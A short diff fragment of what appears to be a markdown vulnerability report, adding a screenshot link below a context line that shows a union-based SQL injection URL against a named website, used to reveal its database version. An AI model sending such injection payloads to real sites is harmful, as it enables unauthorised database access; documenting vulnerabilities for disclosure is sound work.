@@ -23,3 +23,5 @@ https://www.pnaindia.in/page.php?id=6%27%20union%20select%201,2,3,version(),5--+
 - We can see the version of Database.
 
 ![image-20250525234100384](https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202505252341623.png)
+
+![image-20250525234320873](https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202505252343147.png)
